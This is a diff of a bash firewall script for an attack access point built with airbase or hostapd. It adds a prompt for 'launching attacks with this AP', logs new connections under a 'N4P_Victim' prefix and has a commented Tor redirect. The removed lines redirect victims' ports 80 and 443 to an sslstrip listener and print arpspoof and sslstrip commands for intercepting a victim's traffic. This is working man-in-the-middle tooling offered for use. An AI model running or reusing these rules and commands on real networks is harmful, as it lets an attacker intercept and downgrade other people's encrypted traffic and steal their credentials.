-		$IPT $WAN -A POSTROUTING -o $LAN -j MASQUERADE
-		if [[ $AIRBASE == 'On' ]]; then
-			step "$WARN Allowing wirless for airbase, routing $AP through $LAN be sure airbase was configured for $AP and $LAN as the output otherwise adjust these settings"
-			try $IPT -A FORWARD -i $AP -o $LAN -j ACCEPT
-			try $IPT -A FORWARD -i $LAN -o $AP -j ACCEPT
-			next
-		else
-			step "$WARN Allowing wireless for hostapd, routing $WLAN through $LAN\nbe sure hostapd was configured for $WLAN and $LAN as the output\notherwise adjust these settings"
-			try $IPT -A FORWARD -i $WLAN -o $LAN -j ACCEPT
-			try $IPT -A FORWARD -i $LAN -o $WLAN -j ACCEPT
-			next
+		
+	if [[ $FAST != 'True' ]]; then
+		echo "$INFO It's time for specialty hacking configurations"
+		echo -e "These settings are not default as they may break daily activity.\nDaily rules will automagically be rebuilt when you're done hacking all the things"
+		read -p "Are we launching attacks with this AP? y/n?" ATTACK
+		if [[ $ATTACK == [yY] ]]; then
+			fw_ssl
+		elif [[ $ATTACK != [nN] ]]; then
+			echo "$WARN Bad input"; fw_up
 		fi
-	fi
+	fi	
+	#Pass everything through tor 'uncomment the folllowing line if you want all outbound sent through tor'
+	#iptables -A PREROUTING -i $LAN -p tcp -j DNAT --to-destination 127.0.0.1:9050
 
-	if [[ -n $FAST_SSLSTRIP ]]; then
-		step "Fast mode sslstrip"
-		try $IPT $WAN -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
-		try $IPT $WAN -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 10000
-		try $IPT $WAN -A OUTPUT -p tcp --dport 80 -j DNAT --to-destination 127.0.0.1:10000
-		try $IPT $WAN -A OUTPUT -p tcp --dport 443 -j DNAT --to-destination 127.0.0.1:10000
+	#log all connection activity
+	echo ""
+	step "$INFO Set logging"
+	$IPT -A INPUT -i $AP -p tcp -m state --state new -j LOG --log-prefix "N4P_Victim: "
+	next
+
+	if [[ $BRIDGED != 'True' ]]; then
+		echo ""
+		step "$INFO Allowing wirless for airbase, routing $AP through $LAN be sure airbase was configured for $AP and $LAN as the output otherwise adjust these settings"
+		action $IPT $WAN -A POSTROUTING -o $LAN -j MASQUERADE
+		action $IPT -A FORWARD -i $AP -o $LAN -j ACCEPT
+		action $IPT -A FORWARD -i $LAN -o $AP -j ACCEPT
+		#try $IPT -A FORWARD -i $WLAN -o $LAN -j ACCEPT
+		#try $IPT -A FORWARD -i $LAN -o $WLAN -j ACCEPT
 		next
-	else	
-		read -p "$PASS Are we using sslstrip? (y/n) " RESP
-		if [[ $RESP == [yY] ]]; then
-			step "$WARN Forwarding nat traffic to sslstrip server on p10000"
-			try $IPT $WAN -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
-			try $IPT $WAN -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 10000
-			try $IPT $WAN -A OUTPUT -p tcp --dport 80 -j DNAT --to-destination 127.0.0.1:10000
-			try $IPT $WAN -A OUTPUT -p tcp --dport 443 -j DNAT --to-destination 127.0.0.1:10000
-			next
-
-			echo -e "\n$WARN Here are some reminders, first setup spoofing. This will be automagic in the future"
-			echo -e "\n$PASS arpspoof -i wlan0/eth0 192.168.1.10 192.168.1.1 \n where 192.168.1.10 is the victim and 192.168.1.1 is the gateway ip address."
-			echo -e "\nThis means on this interface intercept traffic from *.10 that is using gateway *.1 \n * now run sslstrip"
-			echo -e "\n$PASS python /usr/lib64/sslstrip/sslstrip.py -k -f lock.ico \n * load sslstrip and use the provided lock.ico icon as a replacement if need be."
-			echo -e "\nIf you setup ettercap for MiTM arp spoofing you don't need arpspoof. You must manually edit the ettercap config for this.\n Or just run ettercap and let it sniff arpspoof+sslstrips work"
-		elif [[ $RESP != [nN] ]]; then
-			clear; echo "$WARN Bad input"; fw_up
-		fi
 	fi
 	fw_closure
 }
@@ -633,8 +747,7 @@ fw_up()
 fw_down()
 { 
 	fw_redundant
-	echo "$WARN You are no longer bridged! If you need bridging still you must add that rule yourself."
-	echo "$PASS Defaults loaded for daily use."
+	echo "$INFO Defaults loaded for daily use."
 	fw_closure
 }
 ##################################################################
@@ -659,7 +772,7 @@ menu()
 		clear; echo "$WARN Invalid option"; menu
 	fi
 }
-go()
+go() 
 {
 	depends
 	banner
